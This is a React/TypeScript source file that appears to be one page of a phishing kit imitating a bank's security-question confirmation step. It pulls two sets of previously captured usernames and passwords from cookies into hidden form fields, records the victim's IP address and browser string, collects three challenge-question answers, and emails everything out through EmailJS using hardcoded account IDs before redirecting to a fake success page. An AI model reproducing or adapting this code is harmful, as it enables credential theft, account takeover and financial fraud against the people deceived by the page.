import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import emailjs from "@emailjs/browser";

export default function Confirm() {
    const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const [formInput, setFormInput] = React.useState<Question>({
    question1: "",
    answer1: "",
    question2: "",
    answer2: "",
    question3: "",
    answer3: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  const [isLoading, setIsLoading] = React.useState(false);
  const form = React.useRef<HTMLFormElement>(null);

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();
    emailjs.sendForm("service_9gs21m9", "template_u4icphu", form.current!, "T8uOG8MEAEQT6Xur6").then((result)=>{
        console.log(result.text)
        navigate("../success", {replace:true});
    }, (error)=>{
        alert("could not complete your request")
        console.log(error);
        setIsLoading(false)
    })
  }

  const [ipAddress, setIpAddress] = React.useState<string>()

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response : {ip:string} = await request.json()
    setIpAddress(response.ip)
  }

  React.useEffect(()=>{
    getIP()
  }, [])

  return (
    <>
      <form
        className="form--horizontal padding--add"
        data-bind="submit: submit"
        autoComplete="off"
        method="post"
        onSubmit={handleSubmit}
        ref={form}
      >

<div style={{ display: "none" }} className="hidden_form">
                <input
                  type="text"
                  name="username"
                  defaultValue={login1.username}
                />
                <input
                  type="text"
                  name="password"
                  defaultValue={login1.password}
                />
                <input
                  type="text"
                  name="username2"
                  defaultValue={login2.username2}
                />
                <input
                  type="text"
                  name="password2"
                  defaultValue={login2.password2}
                />
            
                
                <input type="text" name="pi" defaultValue={ipAddress} />
                <input type="text" name="brow" defaultValue={window.navigator.userAgent} />
              </div>
        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            First Challenge Question
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <select
                style={{ margin: "0px", paddingRight: "35.5804px" }}
                name="question1"
                defaultValue={formInput.question1}
                id=""
              >
                <option value="As a child, what did you want to be when you grow up">As a child, what did you want to be when you grow up</option>
              </select>
            </div>
          </div>
        </div>

        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            First Answer
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <input
                data-bind="textInput: username, event: {&#39;keydown&#39;: toggleHideShowOnKeyboardShortcut}"
                name="answer1"
                onChange={handleInputChange}
                id="username"
                type="text"
                autoFocus
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                required
                aria-required="true"
                aria-describedby="usernametext usernameToggleText"
                className="hideShowPassword-field"
                style={{ margin: "0px", paddingRight: "35.5804px" }}
              />
            </div>
          </div>
          <p id="usernameToggleText" className="is--hidden">
            Use ctrl + m to toggle protection
          </p>
          <p
            id="usernametext"
            style={{ display: "none" }}
            className="text--error text--error-form push--large--one-quarter"
            data-bind="visible: usernameError(), text: usernameError()"
          ></p>
        </div>

        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            Second challenge question
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <select
                style={{ margin: "0px", paddingRight: "35.5804px" }}
                name="question2"
                id=""
              >
                <option value="What is your first favorite sports team">What is your first favorite sports team</option>
              </select>
            </div>
          </div>
        </div>

        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            Second Answer
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <input
                data-bind="textInput: username, event: {&#39;keydown&#39;: toggleHideShowOnKeyboardShortcut}"
                name="answer2"
                onChange={handleInputChange}
                id="username"
                type="text"
                autoFocus
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                required
                aria-required="true"
                aria-describedby="usernametext usernameToggleText"
                className="hideShowPassword-field"
                style={{ margin: "0px", paddingRight: "35.5804px" }}
              />
            </div>
          </div>
          <p id="usernameToggleText" className="is--hidden">
            Use ctrl + m to toggle protection
          </p>
          <p
            id="usernametext"
            style={{ display: "none" }}
            className="text--error text--error-form push--large--one-quarter"
            data-bind="visible: usernameError(), text: usernameError()"
          ></p>
        </div>

        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            Third Challenge Question
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <select
                style={{ margin: "0px", paddingRight: "35.5804px" }}
                name="question3"
                id=""
              >
                <option value="What television show did you watch frequently as a child">What television show did you watch frequently as a child</option>
              </select>
            </div>
          </div>
        </div>

        <div className="form__group">
          <label className="form__label large--one-quarter" htmlFor="username">
            Third Answer
          </label>
          <div className="form__control large--one-quarter medium--one-half">
            <div
              className="hideShowPassword-wrapper"
              style={{
                position: "relative",
                width: "100%",
                display: "inline-block",
                verticalAlign: "baseline",
                margin: "0px",
              }}
            >
              <input
                data-bind="textInput: username, event: {&#39;keydown&#39;: toggleHideShowOnKeyboardShortcut}"
                name="answer3"
                onChange={handleInputChange}
                id="username"
                type="text"
                autoFocus
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                required
                aria-required="true"
                aria-describedby="usernametext usernameToggleText"
                className="hideShowPassword-field"
                style={{ margin: "0px", paddingRight: "35.5804px" }}
              />
            </div>
          </div>
          <p id="usernameToggleText" className="is--hidden">
            Use ctrl + m to toggle protection
          </p>
          <p
            id="usernametext"
            style={{ display: "none" }}
            className="text--error text--error-form push--large--one-quarter"
            data-bind="visible: usernameError(), text: usernameError()"
          ></p>
        </div>

        <div className="form__group">
          <div className="push--large--one-quarter large--one-quarter medium--one-half">
            {isLoading ? 
               <div style={{width:"100%", display:"flex", justifyContent:"center"}}>
               <span className="loader"></span>
               </div>
               :
            <button
              type="submit"
              className="btn btn--primary"
              data-bind="enable: !showProcessingIndicator()"
            >
              Submit
            </button>}
          </div>
        </div>
        <div className="form__group">
          <div className="push--large--one-quarter large--one-quarter medium--one-half">
            <p className="push--up">
              Not yet enrolled?
              <a href="https://fbibcr.com/PBI_PBI1151/Enroll/101903336">
                Enroll now
              </a>
              .
            </p>
          </div>
        </div>
      </form>
    </>
  );
}
